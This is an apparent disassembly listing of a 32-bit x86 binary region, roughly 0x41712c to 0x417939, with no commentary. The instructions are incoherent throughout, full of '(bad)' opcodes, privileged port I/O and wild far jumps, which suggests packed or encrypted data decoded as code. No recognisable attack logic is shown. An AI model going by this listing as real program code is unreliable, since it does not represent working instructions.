  41712c:	xchg   esi,ebp
  41712e:	fisttp WORD PTR [esi-0x19b7409b]
  417134:	popf   
  417135:	stos   BYTE PTR es:[edi],al
  417136:	test   al,0x0
  417138:	pop    ecx
  417139:	dec    ebx
  41713a:	mov    ds,WORD PTR [eax-0x7397e92c]
  417140:	test   eax,0xe03490d2
  417145:	jbe    0x4170e9
  417147:	mov    dh,0xd5
  417149:	rcl    BYTE PTR [ecx+0x785ac3cf],cl
  41714f:	fxch   st(4)
  417151:	ja     0x417199
  417153:	push   ds
  417154:	das    
  417155:	imul   edi,edx,0x6a
  417158:	loopne 0x4171a4
  41715a:	in     eax,dx
  41715b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41715c:	xor    eax,eax
  41715e:	push   edx
  41715f:	dec    esp
  417160:	mov    ebx,0x6c0f4c3d
  417165:	iret   
  417166:	add    DWORD PTR [eax+0x50],0xcc8a877b
  41716d:	sbb    al,0x49
  41716f:	repz imul ebx,DWORD PTR [eax+0x2a],0x0
  417174:	or     bl,BYTE PTR [ebp+0x3dc6bf22]
  41717a:	scas   al,BYTE PTR es:[edi]
  41717b:	(bad)
  41717f:	fbld   TBYTE PTR [edi]
  417181:	sar    DWORD PTR [ebx],cl
  417183:	sbb    BYTE PTR [edx-0x381f00da],ch
  417189:	mov    ecx,0xf7991a4
  41718e:	idiv   BYTE PTR [edi+eax*1+0x322a1fd]
  417195:	adc    cl,0x7e
  417198:	and    BYTE PTR [bx],bh
  41719b:	pop    ss
  41719c:	or     edx,esi
  41719e:	sub    eax,0xc4495e80
  4171a3:	das    
  4171a4:	jecxz  0x417159
  4171a6:	xor    bh,bl
  4171a8:	mov    eax,ss:0x4303bf5d
  4171ae:	repz pop ecx
  4171b0:	cs scas al,BYTE PTR es:[edi]
  4171b2:	add    DWORD PTR [edx],ebp
  4171b4:	cld    
  4171b5:	fst    DWORD PTR [ebp+eiz*4+0x14]
  4171b9:	sbb    BYTE PTR [ecx-0x4d9cba67],ch
  4171bf:	lahf   
  4171c0:	or     ah,ah
  4171c2:	and    BYTE PTR [edx-0x32],bl
  4171c5:	xor    ebx,DWORD PTR [ecx]
  4171c7:	call   0xf5c2d65
  4171cc:	mov    ch,0xb8
  4171ce:	mov    eax,ds:0x6557dee0
  4171d3:	add    al,0x4
  4171d5:	imul   eax,DWORD PTR [edx-0x64e22081],0xffffffc5
  4171dc:	in     eax,0xb1
  4171de:	dec    edi
  4171df:	sub    BYTE PTR [edi-0x5472226],0x69
  4171e6:	inc    ecx
  4171e7:	out    0xac,al
  4171e9:	(bad)  
  4171ea:	jmp    0xc970:0xad6b9f5
  4171f1:	mov    bl,0xb4
  4171f3:	lods   al,BYTE PTR ds:[esi]
  4171f4:	lea    esp,[ebx+0x6e94a95c]
  4171fa:	aam    0x46
  4171fc:	aaa    
  4171fd:	fsubr  QWORD PTR [esi-0x6e]
  417200:	or     bl,BYTE PTR [edi-0x79]
  417203:	push   0xffffffb8
  417205:	mov    esi,0xb5a92f35
  41720a:	sbb    eax,0x9d3c2f97
  41720f:	pop    ss
  417210:	icebp  
  417211:	xchg   bh,bh
  417213:	leave  
  417214:	inc    esi
  417215:	sbb    eax,0x795fde4f
  41721a:	imul   dl
  41721c:	into   
  41721d:	mov    esi,0xf444a608
  417222:	xchg   BYTE PTR [edi],ch
  417224:	js     0x4172a5
  417226:	pop    ebp
  417227:	(bad)  
  417228:	push   edx
  417229:	pop    ecx
  41722a:	jbe    0x41726b
  41722c:	or     DWORD PTR [ecx+0x109f9dfd],ebp
  417232:	jmp    0xc56675b3
  417237:	loopne 0x417295
  417239:	(bad)
  41723c:	sbb    eax,0xdb315104
  417241:	jb     0x417299
  417243:	jne    0x417276
  417245:	mov    dh,0x56
  417247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417248:	inc    esp
  417249:	and    eax,0xf09f642b
  41724e:	mov    ds:0xb7824a77,al
  417253:	xchg   edi,eax
  417254:	fcom   DWORD PTR [ebp-0x67]
  417257:	push   es
  417258:	adc    al,0x9
  41725a:	adc    DWORD PTR [ecx+0x19],0xffffff9f
  41725e:	mov    al,0xf3
  417260:	lea    ebp,[ebx*2-0x5359d5fc]
  417267:	mov    BYTE PTR [esi+0x2b],bh
  41726a:	add    edi,ebx
  41726c:	cmp    BYTE PTR [ebp-0x400de8aa],ch
  417272:	jmp    0x4172c7
  417274:	shl    dh,cl
  417276:	xchg   DWORD PTR [esi-0x5f],esi
  417279:	popf   
  41727a:	dec    ebp
  41727b:	leave  
  41727c:	into   
  41727d:	out    0x2b,eax
  41727f:	jle    0x4172b1
  417281:	sbb    eax,0xaaf9beb
  417286:	clc    
  417287:	pop    esi
  417288:	adc    cl,BYTE PTR [ecx-0x1a]
  41728b:	dec    ebp
  41728c:	imul   esp,DWORD PTR [eax],0xffffffd2
  41728f:	push   ebp
  417290:	je     0x417298
  417292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417293:	pop    eax
  417294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417295:	imul   esp,DWORD PTR [ecx+0x5e],0xbfd3c58b
  41729c:	dec    edx
  41729d:	je     0x417251
  41729f:	std    
  4172a0:	pushf  
  4172a1:	jno    0x417265
  4172a3:	test   eax,0x8db4fef7
  4172a8:	lock xchg edx,eax
  4172aa:	fist   WORD PTR [edx-0x51422f98]
  4172b0:	mov    bl,0x4a
  4172b2:	jnp    0x41729f
  4172b4:	lods   eax,DWORD PTR es:[esi]
  4172b6:	mov    cl,0x21
  4172b8:	scas   al,BYTE PTR es:[edi]
  4172b9:	pop    ebx
  4172ba:	push   ebp
  4172bb:	sbb    eax,DWORD PTR [edx-0x22]
  4172be:	test   cl,0x1b
  4172c1:	retf   
  4172c2:	cs (bad) 
  4172c5:	dec    esp
  4172c6:	in     eax,0x3d
  4172c8:	fsubr  st(5),st
  4172ca:	ficomp DWORD PTR [eax+0x51]
  4172cd:	fidiv  WORD PTR [ebp+0x5e]
  4172d0:	daa    
  4172d1:	call   0xc095:0x4a723031
  4172d8:	retf   
  4172d9:	xor    al,0x98
  4172db:	stos   BYTE PTR es:[edi],al
  4172dc:	or     eax,0xa3529e67
  4172e1:	jmp    0x417279
  4172e3:	jmp    0x417277
  4172e5:	or     DWORD PTR [esi],edi
  4172e7:	lods   eax,DWORD PTR ds:[esi]
  4172e8:	push   edx
  4172e9:	aas    
  4172ea:	pop    ds
  4172eb:	xor    al,0x90
  4172ed:	xor    al,0x15
  4172ef:	mov    BYTE PTR [edi+0x50],cl
  4172f2:	rol    ch,1
  4172f4:	lds    ebx,FWORD PTR [eax]
  4172f6:	jb     0x417319
  4172f8:	mov    ch,BYTE PTR [esi-0x22eec265]
  4172fe:	repz leave 
  417300:	in     al,dx
  417301:	je     0x417321
  417303:	into   
  417304:	bound  ebp,QWORD PTR [ebx]
  417306:	leave  
  417307:	aad    0xe0
  417309:	mov    esp,0x943d03c8
  41730e:	pushf  
  41730f:	inc    edi
  417310:	cmp    esi,ebp
  417312:	(bad)  
  417313:	jge    0x4172dc
  417315:	xchg   esi,eax
  417316:	sbb    DWORD PTR [esi+ecx*2-0x4d],0xffffff9d
  41731b:	cs mov ecx,0xb15c099d
  417321:	dec    esp
  417322:	les    esp,FWORD PTR [ebp+0x40]
  417325:	or     al,0x7
  417327:	dec    DWORD PTR [edx-0x24]
  41732a:	rcr    BYTE PTR [esi-0xf],1
  41732d:	inc    ebp
  41732e:	out    dx,eax
  41732f:	push   es
  417330:	dec    ebx
  417331:	out    0x76,al
  417333:	pop    ebx
  417334:	or     DWORD PTR [si+0x70],ebp
  417338:	scas   al,BYTE PTR es:[edi]
  417339:	enter  0x14e0,0xcc
  41733d:	leave  
  41733e:	cmp    eax,0x55e60add
  417343:	adc    ch,cl
  417345:	or     dh,BYTE PTR [edx+0x136dbc9a]
  41734b:	jns    0x658f8102
  417351:	ins    BYTE PTR es:[edi],dx
  417352:	shr    DWORD PTR [ebx-0x7047c7c2],1
  417358:	mov    al,0x11
  41735a:	retf   0xe645
  41735d:	inc    esp
  41735e:	pop    es
  41735f:	in     eax,dx
  417360:	inc    ebp
  417361:	mov    bl,0x2b
  417363:	fistp  WORD PTR [esi+0x721ffb6a]
  417369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41736a:	jnp    0x417359
  41736c:	lahf   
  41736d:	dec    ebx
  41736e:	outs   dx,BYTE PTR ds:[esi]
  41736f:	inc    edx
  417370:	dec    edi
  417371:	fnstenv [ebx-0x78]
  417374:	or     eax,DWORD PTR [esp+eax*8-0x6b795144]
  41737b:	bound  ecx,QWORD PTR [di-0x31]
  41737f:	ret    
  417380:	(bad)  
  417381:	in     al,dx
  417382:	add    BYTE PTR [eax],ah
  417384:	ret    
  417385:	shl    esi,0x64
  417388:	mov    eax,ds:0xf89c003b
  41738d:	cmp    DWORD PTR ds:0x8dc86b39,0x1d
  417394:	(bad)  
  417395:	ss jmp 0x63265348
  41739b:	lahf   
  41739c:	xchg   DWORD PTR [ebp+0x30dda0e3],edi
  4173a2:	cli    
  4173a3:	xchg   cl,dh
  4173a5:	lock sbb al,0xb3
  4173a8:	pop    ds
  4173a9:	daa    
  4173aa:	sub    eax,0x3c18428f
  4173af:	(bad)  
  4173b0:	int3   
  4173b1:	cmc    
  4173b2:	pusha  
  4173b3:	xchg   esp,eax
  4173b4:	jecxz  0x417339
  4173b6:	(bad)  
  4173b7:	xor    al,0xd6
  4173b9:	jmp    0x417395
  4173bb:	cmp    cl,BYTE PTR [esi]
  4173bd:	fstp   TBYTE PTR [ecx+0x2c7012f]
  4173c3:	inc    esp
  4173c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173c5:	pop    edx
  4173c6:	into   
  4173c7:	cwde   
  4173c8:	jmp    0xb0c2:0xc62b7ac1
  4173cf:	pop    es
  4173d0:	pop    ss
  4173d1:	mov    eax,0x4597e21b
  4173d6:	jmp    0xc0a6421
  4173db:	adc    eax,0x1e79b7da
  4173e0:	std    
  4173e1:	or     DWORD PTR [ebx+0x5f],ecx
  4173e4:	ret    0xeae3
  4173e7:	outs   dx,DWORD PTR ds:[esi]
  4173e8:	and    ch,0x9
  4173eb:	xor    eax,0xd409469e
  4173f0:	jmp    DWORD PTR [edi-0x45]
  4173f3:	lea    esi,[ebx+esi*8]
  4173f6:	fild   DWORD PTR [eax]
  4173f8:	xchg   esi,eax
  4173f9:	or     DWORD PTR [ebx-0x24],esi
  4173fc:	ins    DWORD PTR es:[edi],dx
  4173fd:	out    dx,eax
  4173fe:	sub    ecx,edx
  417400:	push   esp
  417401:	fucomip st,st(2)
  417403:	mov    eax,0x1292c0ca
  417408:	xchg   esp,eax
  417409:	inc    ebx
  41740a:	shl    BYTE PTR [ebx-0x37],cl
  41740d:	jns    0x417479
  41740f:	or     esp,edi
  417411:	xor    DWORD PTR [ecx-0x19475358],edx
  417417:	xor    DWORD PTR [ebx],0x4a33ce23
  41741d:	repnz mov ds:0x410cb7ab,al
  417423:	push   edi
  417424:	lahf   
  417425:	fmul   st(6),st
  417427:	stos   BYTE PTR es:[edi],al
  417428:	fs iret 
  41742a:	jge    0x41747d
  41742c:	or     bl,BYTE PTR [ebp+0xc91dbae]
  417432:	gs xchg ebx,eax
  417434:	int3   
  417435:	nop
  417436:	xchg   BYTE PTR [ebx+0x1c],ah
  417439:	mov    ds:0x9acfa602,eax
  41743e:	retf   
  41743f:	xor    bl,BYTE PTR [ecx]
  417441:	add    esi,DWORD PTR [esi-0x68da40ed]
  417447:	ret    
  417448:	nop
  417449:	test   al,0x2d
  41744b:	push   edx
  41744c:	daa    
  41744d:	xlat   BYTE PTR ds:[ebx]
  41744e:	scas   eax,DWORD PTR es:[edi]
  41744f:	add    ebx,DWORD PTR [ebx]
  417451:	cmp    dl,ch
  417453:	xchg   DWORD PTR [edx+0x1c],edx
  417456:	jns    0x4173f4
  417458:	adc    ebp,DWORD PTR [edx+0x37]
  41745b:	fbstp  TBYTE PTR [ebp+edx*2-0x5a49b886]
  417462:	call   DWORD PTR [eax+eax*4]
  417465:	inc    ebx
  417466:	add    eax,0x78c4e9c6
  41746b:	sbb    DWORD PTR [edx],eax
  41746d:	(bad)
  417470:	jmp    0x93438160
  417475:	inc    edx
  417476:	inc    edx
  417477:	icebp  
  417478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417479:	add    ch,BYTE PTR [esi-0x7d]
  41747c:	xor    eax,0xf5123f7
  417481:	jae    0x417479
  417483:	je     0x41746a
  417485:	adc    eax,0xd80444aa
  41748a:	jno    0x4174cd
  41748c:	mov    eax,0xceef52a7
  417491:	ja     0x41745e
  417493:	imul   eax,DWORD PTR [eax+0x39],0xcf118cab
  41749a:	xchg   esi,eax
  41749b:	aaa    
  41749c:	jg     0x41748b
  41749e:	xchg   ebp,eax
  41749f:	inc    cl
  4174a1:	lahf   
  4174a2:	inc    edx
  4174a3:	sbb    DWORD PTR [edi+0x176363eb],ebp
  4174a9:	lea    edx,[eax]
  4174ab:	int    0x51
  4174ad:	jmp    0x907a:0xd1a18436
  4174b4:	xor    bl,bl
  4174b6:	mov    esi,0xf77d2862
  4174bb:	cmp    al,dh
  4174bd:	bound  ecx,QWORD PTR [ebx]
  4174bf:	lds    ecx,FWORD PTR [edx+ecx*8+0x7f34fd54]
  4174c6:	lods   al,BYTE PTR ds:[esi]
  4174c7:	mov    ebx,0xc2d50a44
  4174cc:	sub    BYTE PTR [ebx-0xa9cbed2],cl
  4174d2:	mov    ds:0xd404d82a,eax
  4174d7:	addr16 xchg esi,eax
  4174d9:	pop    es
  4174da:	addr16 dec ebp
  4174dc:	mov    eax,ds:0x12b06e5c
  4174e1:	xlat   BYTE PTR ds:[ebx]
  4174e2:	push   ebp
  4174e3:	mov    esi,0xc0e5fe89
  4174e8:	adc    esi,edx
  4174ea:	add    ah,al
  4174ec:	fisttp WORD PTR [ebp-0xc]
  4174ef:	repz sbb eax,0xacfa293
  4174f5:	or     al,0x53
  4174f7:	ins    DWORD PTR es:[edi],dx
  4174f8:	stos   BYTE PTR es:[edi],al
  4174f9:	out    0x45,eax
  4174fb:	and    eax,0x8d7953c7
  417500:	pop    eax
  417501:	pop    edx
  417502:	sbb    ebp,DWORD PTR [eax]
  417504:	xor    ch,BYTE PTR [ecx-0x6549f6e3]
  41750a:	mov    ebx,0xeb62b128
  41750f:	add    eax,0x4bfe5a4d
  417514:	ja     0x41753d
  417516:	push   ds
  417517:	pop    ss
  417518:	das    
  417519:	adc    cl,cl
  41751b:	dec    ebx
  41751c:	push   ecx
  41751d:	les    ebp,FWORD PTR [ebx]
  41751f:	stc    
  417520:	out    0x9d,al
  417522:	adc    BYTE PTR [edx-0x72895b86],0x72
  417529:	stos   BYTE PTR es:[edi],al
  41752a:	xchg   cl,bh
  41752c:	ret    
  41752d:	(bad)  
  41752e:	mov    bh,0x82
  417530:	cmp    esi,ecx
  417532:	sub    eax,0x303b106c
  417537:	lock xor al,0xbd
  41753a:	pop    esp
  41753b:	inc    esp
  41753c:	push   cs
  41753d:	mov    DWORD PTR [eax-0x32a83a4d],ebx
  417543:	repnz xor edx,eax
  417546:	cmp    esi,esi
  417548:	jg     0x4174fe
  41754a:	hlt    
  41754b:	int    0xc8
  41754d:	nop
  41754e:	push   edx
  41754f:	(bad)  
  417550:	and    BYTE PTR [esi+0x53],bl
  417553:	sub    BYTE PTR [edx+0x59],ah
  417556:	fmul   DWORD PTR [ebx]
  417558:	std    
  417559:	test   eax,0xe0d9b376
  41755e:	dec    esi
  41755f:	loop   0x4175aa
  417561:	adc    ch,BYTE PTR [ebx-0x4e6409e2]
  417567:	cmp    eax,0x242f0114
  41756c:	test   DWORD PTR [ebx],ebx
  41756e:	inc    ecx
  41756f:	js     0x41753e
  417571:	(bad)  
  417573:	xor    DWORD PTR [edi+ebx*4-0x1810e022],0x8813fae8
  41757e:	mov    dh,0x5
  417580:	mov    fs,WORD PTR ss:[edi+0x23074abf]
  417587:	cmp    edi,DWORD PTR [ebp-0x64]
  41758a:	or     cl,BYTE PTR [edi+0x3e418017]
  417590:	cmp    eax,0xfbfb887c
  417595:	mov    ah,bh
  417597:	cdq    
  417598:	lods   al,BYTE PTR ds:[esi]
  417599:	sahf   
  41759a:	rcl    BYTE PTR [edi-0x590b9976],0xf4
  4175a1:	mov    al,0xa
  4175a3:	das    
  4175a4:	push   ss
  4175a5:	clc    
  4175a6:	mov    ebx,0x159dab7b
  4175ab:	and    DWORD PTR [ebp+0x5cbee4f7],edi
  4175b1:	aam    0x11
  4175b3:	repz cmp esp,ebp
  4175b6:	retw   
  4175b8:	or     al,0x95
  4175ba:	sar    BYTE PTR [edi],cl
  4175bc:	fist   WORD PTR es:[edi-0x714939cf]
  4175c3:	cmp    ah,0x73
  4175c6:	out    0x21,eax
  4175c8:	push   cs
  4175c9:	and    ah,cl
  4175cb:	fild   WORD PTR [ecx-0x1602e8ae]
  4175d1:	aas    
  4175d2:	sbb    al,0xe4
  4175d4:	ja     0x417598
  4175d6:	nop
  4175d7:	ins    BYTE PTR es:[edi],dx
  4175d8:	sub    edi,DWORD PTR [esi-0x50]
  4175db:	sub    dl,dh
  4175dd:	dec    ebp
  4175de:	sbb    eax,0x3023c770
  4175e3:	jnp    0x417634
  4175e5:	jae    0x417637
  4175e7:	add    al,0xd0
  4175e9:	ss inc edi
  4175eb:	mov    dl,0xc4
  4175ed:	cmp    DWORD PTR [ebx+0x3c],ecx
  4175f0:	ss ret 0x74f9
  4175f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175f5:	out    dx,eax
  4175f6:	fs addr16 jmp 0x417659
  4175fa:	test   BYTE PTR [esi],al
  4175fc:	xor    eax,DWORD PTR [edx-0x34]
  4175ff:	pushf  
  417600:	or     eax,0xedcad0f7
  417605:	inc    ebp
  417606:	test   DWORD PTR [esi],edi
  417608:	xor    edi,esi
  41760a:	pop    edx
  41760b:	pop    DWORD PTR [ebx+0x30]
  41760e:	mov    WORD PTR [eax-0x57],gs
  417611:	pusha  
  417612:	aam    0x42
  417614:	cmp    ecx,DWORD PTR [esi]
  417616:	xor    ecx,ebx
  417618:	call   0x30e4:0xf7478fe1
  41761f:	or     eax,0xdae8d3d
  417624:	in     al,0x27
  417626:	cmp    al,0xe4
  417628:	cmc    
  417629:	sbb    al,0x99
  41762b:	idiv   esp
  41762d:	(bad)  
  41762e:	sti    
  41762f:	es pop esp
  417631:	inc    edx
  417632:	sub    DWORD PTR [edx],ebp
  417634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417635:	daa    
  417636:	ds std 
  417638:	xchg   edi,eax
  417639:	xchg   ebp,eax
  41763a:	aad    0x71
  41763c:	out    0x76,al
  41763e:	inc    edx
  41763f:	cld    
  417640:	and    al,0x22
  417642:	int3   
  417643:	jecxz  0x41768d
  417645:	retf   0x5b1d
  417648:	add    DWORD PTR [edx-0x7270a85],0xffffffe0
  41764f:	daa    
  417650:	xor    edi,DWORD PTR [ecx+0x3e5790e7]
  417656:	inc    esp
  417657:	rol    ecx,0xd5
  41765a:	jmp    0xda0d260a
  41765f:	pop    eax
  417660:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  417662:	mov    ecx,0x77371d09
  417667:	mov    ebp,DWORD PTR [edx+0x59]
  41766a:	mov    ch,0x55
  41766c:	aas    
  41766d:	xor    eax,0x8159c381
  417672:	add    ch,BYTE PTR [edi-0xa]
  417675:	psubusb mm7,QWORD PTR [edx+ebp*1]
  417679:	outs   dx,BYTE PTR ds:[esi]
  41767a:	mov    al,0x6f
  41767c:	adc    DWORD PTR [eax-0x65],ecx
  41767f:	jo     0x417683
  417681:	(bad)  
  417682:	pop    esp
  417683:	bound  esi,QWORD PTR [esi-0x7e]
  417686:	div    bh
  417688:	xor    esi,DWORD PTR [eax-0x72298676]
  41768e:	add    DWORD PTR [edi-0x765a6e9c],esp
  417694:	mov    ah,0x90
  417696:	jg     0x4176c5
  417698:	loope  0x41764d
  41769a:	sub    al,0x88
  41769c:	jne    0x417636
  41769e:	fs push ecx
  4176a0:	fwait
  4176a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176a2:	xchg   edx,eax
  4176a3:	jbe    0x417642
  4176a5:	enter  0x45da,0xbc
  4176a9:	jo     0x417692
  4176ab:	ret    
  4176ac:	push   0x5b
  4176ae:	sbb    DWORD PTR [ecx-0x30],esp
  4176b1:	push   es
  4176b2:	mov    ecx,esp
  4176b4:	jecxz  0x4176e2
  4176b6:	stc    
  4176b7:	dec    esi
  4176b8:	clc    
  4176b9:	pushf  
  4176ba:	repz jbe 0x417711
  4176bd:	xchg   ecx,eax
  4176be:	mov    edi,DWORD PTR [edx-0x4b]
  4176c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176c2:	sub    eax,0x586be5b4
  4176c7:	xor    eax,0xc7756a7c
  4176cc:	loop   0x41767f
  4176ce:	mov    bh,0xde
  4176d0:	or     dh,dh
  4176d2:	jb     0x4176ca
  4176d4:	adc    ebx,DWORD PTR [ecx]
  4176d6:	popf   
  4176d7:	arpl   WORD PTR [ebx+0x46],dx
  4176da:	mov    bl,0xed
  4176dc:	ss push cs
  4176de:	neg    esi
  4176e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176e1:	cmp    BYTE PTR ds:0x81573d80,ch
  4176e7:	lahf   
  4176e8:	ins    BYTE PTR es:[edi],dx
  4176e9:	mov    edx,0x147fd851
  4176ee:	inc    esi
  4176ef:	inc    ecx
  4176f0:	fcomp  DWORD PTR [edx+0x754b082]
  4176f6:	sbb    al,0xe
  4176f8:	push   esp
  4176f9:	jge    0x41772f
  4176fb:	stos   BYTE PTR es:[edi],al
  4176fc:	cmp    bl,dl
  4176fe:	mov    eax,ds:0x4d0912c6
  417703:	jb     0x417703
  417705:	hlt    
  417706:	dec    eax
  417707:	dec    ecx
  417708:	sbb    bl,dl
  41770a:	xor    bh,bh
  41770c:	in     eax,dx
  41770d:	pop    esp
  41770e:	xor    al,0xe6
  417710:	sub    esi,ecx
  417712:	mov    edx,0x6f2c0982
  417717:	pop    ebx
  417718:	loop   0x417727
  41771a:	test   edx,edi
  41771c:	push   ds
  41771d:	pusha  
  41771e:	adc    al,0xb8
  417720:	imul   DWORD PTR [edi]
  417722:	jmp    0x6bca:0x5a89e951
  417729:	pop    es
  41772a:	adc    BYTE PTR [edx],0x3c
  41772d:	pop    ds
  41772e:	sub    bl,dl
  417730:	js     0x417743
  417732:	xor    BYTE PTR [edi-0x4a],cl
  417735:	lock push ds
  417737:	jne    0x41774c
  417739:	push   ebx
  41773a:	cmp    eax,0x669ac4db
  41773f:	call   0xd62f:0xe89d9721
  417746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417747:	test   eax,0x8f148fee
  41774c:	xor    esi,edi
  41774e:	cmp    DWORD PTR [edi+0x794b5091],esi
  417754:	dec    esp
  417755:	cmc    
  417756:	repnz xor cl,bh
  417759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41775a:	int3   
  41775b:	adc    eax,0xa9eeda6c
  417760:	sbb    esp,esp
  417762:	mov    cl,0xc5
  417764:	mov    ecx,DWORD PTR [eax+0x76]
  417767:	ret    
  417768:	dec    ebx
  417769:	sub    al,0x6
  41776b:	push   ecx
  41776c:	jne    0x4177a2
  41776e:	inc    ebx
  41776f:	or     DWORD PTR [esi+0x55f1cf90],0xffffffab
  417776:	ins    DWORD PTR es:[edi],dx
  417777:	adc    ebp,DWORD PTR [edx+ebx*2+0x6c]
  41777b:	push   esi
  41777c:	cmp    dh,BYTE PTR [edi]
  41777e:	iret   
  41777f:	in     al,dx
  417780:	mov    BYTE PTR [esi+0xd],ch
  417783:	jmp    0xe75b:0xb80d8318
  41778a:	sti    
  41778b:	mov    eax,0x4ee00d78
  417790:	push   edi
  417791:	mov    bl,0x91
  417793:	pop    ecx
  417794:	sub    al,0x60
  417796:	test   eax,0x1bf15341
  41779b:	sar    ebp,0x40
  41779e:	xor    eax,0xd3f8a37a
  4177a3:	ret    0x76e2
  4177a6:	or     BYTE PTR [edi-0x10e53cdb],ah
  4177ac:	mov    ds:0xe5c96bb3,eax
  4177b1:	div    dl
  4177b3:	data16 cmp al,0x30
  4177b6:	mov    ah,0x5f
  4177b8:	and    ebx,DWORD PTR [ebp-0x3c4d1901]
  4177be:	(bad)  
  4177bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177c0:	mov    gs,WORD PTR [edi-0x11]
  4177c3:	les    edx,FWORD PTR [ecx-0x5d73d6e9]
  4177c9:	call   0x512de93e
  4177ce:	mov    ch,0x1d
  4177d0:	in     eax,0xd6
  4177d2:	fnstcw WORD PTR [eax-0x62]
  4177d5:	sub    ebp,DWORD PTR [edi]
  4177d7:	dec    edx
  4177d8:	adc    BYTE PTR [edi+0x77b58181],0x55
  4177df:	int3   
  4177e0:	push   ebp
  4177e1:	aad    0xf6
  4177e3:	cdq    
  4177e4:	pop    ecx
  4177e5:	js     0x4177fe
  4177e7:	sbb    edx,DWORD PTR [eax]
  4177e9:	or     eax,0xdf4e137e
  4177ee:	xchg   esp,eax
  4177ef:	pushf  
  4177f0:	call   0x909fca90
  4177f5:	jl     0x4177d5
  4177f7:	nop
  4177f8:	mov    dl,0xe4
  4177fa:	test   eax,0x50b1ada
  4177ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417800:	jmp    0x4c30802b
  417805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417806:	pop    esp
  417807:	fs mov ebx,es
  41780a:	repnz (bad) 
  41780c:	imul   ebx,DWORD PTR [ecx-0x3b],0xffffff81
  417810:	or     ah,cl
  417812:	sbb    BYTE PTR [edi],bl
  417814:	push   esi
  417815:	les    ebx,FWORD PTR [ebp+eiz*2+0x233580c9]
  41781c:	or     edi,DWORD PTR [ecx-0x24c2b221]
  417822:	jg     0x417892
  417824:	mov    ecx,0x7be498cb
  417829:	repz mov ebx,0xfbb28acd
  41782f:	adc    DWORD PTR [eax-0x3d],ebp
  417832:	loop   0x4177f1
  417834:	adc    ebp,edx
  417836:	addr16 in al,0x4d
  417839:	xor    esi,DWORD PTR [edx-0x3d3b1c5d]
  41783f:	(bad)  
  417840:	jecxz  0x4177f6
  417842:	outs   dx,DWORD PTR ds:[esi]
  417843:	and    esp,esp
  417845:	mov    esp,0x8533985f
  41784a:	xchg   esp,eax
  41784b:	ficomp DWORD PTR [esp+eiz*4+0x1b]
  41784f:	xor    bh,cl
  417851:	fcomp  QWORD PTR [edx+0x4d8ad2e7]
  417857:	(bad)  
  417858:	and    al,0xf3
  41785a:	lods   eax,DWORD PTR ds:[esi]
  41785b:	or     al,0x59
  41785d:	push   0xffffff9a
  41785f:	mov    eax,0xd42bc4ff
  417864:	mov    al,0x8f
  417866:	outs   dx,BYTE PTR ds:[esi]
  417867:	mov    ch,0x9d
  417869:	add    DWORD PTR [ebp+0x55],edx
  41786c:	sub    al,0x2e
  41786e:	push   0x5d
  417870:	mov    esp,0xab191106
  417875:	add    eax,0xdb90cd30
  41787a:	add    ebx,DWORD PTR [esi-0x41a6757b]
  417880:	fsub   DWORD PTR [esi+ebx*4+0x7af9d65]
  417887:	dec    esi
  417888:	sbb    eax,0xf7336e43
  41788d:	pop    es
  41788e:	jle    0x417885
  417890:	inc    edi
  417891:	inc    ebx
  417892:	stos   DWORD PTR es:[edi],eax
  417893:	jg     0x4178d5
  417895:	push   ax
  417897:	inc    ecx
  417898:	jo     0x41784a
  41789a:	cmp    esp,DWORD PTR [ebx-0x7e7973a4]
  4178a0:	mov    dl,0xd9
  4178a2:	cmc    
  4178a3:	nop
  4178a4:	mov    DWORD PTR [ebp-0x36b82c57],ebp
  4178aa:	ins    BYTE PTR es:[edi],dx
  4178ab:	pop    ecx
  4178ac:	aas    
  4178ad:	sub    ecx,edx
  4178af:	mov    BYTE PTR [edi],dh
  4178b1:	push   ebp
  4178b2:	or     eax,0xf914c4f4
  4178b7:	cli    
  4178b8:	mov    ds:0xfadf911c,al
  4178bd:	lock sub ebx,DWORD PTR [ecx+0x2ef2777b]
  4178c4:	std    
  4178c5:	mov    eax,ds:0xb0035386
  4178ca:	js     0x41790d
  4178cc:	loope  0x41789f
  4178ce:	adc    cl,BYTE PTR [ebx]
  4178d0:	mov    ebp,0x99a925fc
  4178d5:	loope  0x41790a
  4178d7:	lock pop es
  4178d9:	call   DWORD PTR [ebp+0x6b1500ad]
  4178df:	mov    esi,0x39559bd2
  4178e4:	jb     0x41786d
  4178e6:	test   al,0x55
  4178e8:	dec    edx
  4178e9:	mov    ds:0x794ba298,eax
  4178ee:	inc    ecx
  4178ef:	sub    eax,0x1dbf5f4c
  4178f4:	(bad)  
  4178f6:	call   0x401fbd67
  4178fb:	cli    
  4178fc:	scas   al,BYTE PTR es:[edi]
  4178fd:	fwait
  4178fe:	sbb    eax,0x41429f80
  417903:	push   si
  417905:	inc    eax
  417906:	pop    esp
  417907:	jmp    0xac3a:0x470b4aca
  41790e:	pop    ebx
  41790f:	lds    edx,FWORD PTR [ecx-0x5c453745]
  417915:	(bad)  
  417916:	or     eax,0x82bcf1f4
  41791b:	(bad)  
  41791c:	clc    
  41791d:	out    dx,al
  41791e:	mov    edi,0xa063be70
  417923:	pop    ds
  417924:	mov    edi,0xe632b0e2
  417929:	ficomp DWORD PTR [esi-0xf]
  41792c:	jns    0x4178dc
  41792e:	lahf   
  41792f:	jnp    0x4178e4
  417931:	mov    DWORD PTR [eax],esi
  417933:	ins    DWORD PTR es:[edi],dx
  417934:	mov    al,ds:0xeea76537
  417939:	jmp    0x2d51ea53
